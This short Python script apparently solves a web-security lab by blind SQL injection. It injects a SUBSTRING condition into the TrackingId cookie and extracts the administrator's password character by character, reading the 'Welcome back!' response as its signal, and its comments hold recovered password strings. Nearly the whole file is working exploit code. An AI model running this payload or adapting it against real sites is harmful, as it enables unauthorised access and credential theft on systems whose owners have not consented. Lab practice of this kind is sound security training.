import requests, string, sys, warnings, time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)

req = requests.Session()
url = "#LINK#"
hint = "Welcome back!"

password = ""   # ag2yj74y5ng8k1uvbxni // length 20
                # kthtccl0eonf2ki7z3ew 
index = 1 

# For debugging
proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080',
    }

while True:
    for char in string.ascii_letters + string.digits: # a-z,A-Z,0-9
        sys.stdout.write(f"\r[+] Password: {password}{char}")
        cookies = {
            "session" : "Px7xsMmck1bid1gaJ58sMRfoJyES71RK",
            "TrackingId" : f"hdEvUCfGgEj40gyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{index},1) = '{char}",
            }
        resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        if hint in resp.text:
            password = password + char
            index = index + 1
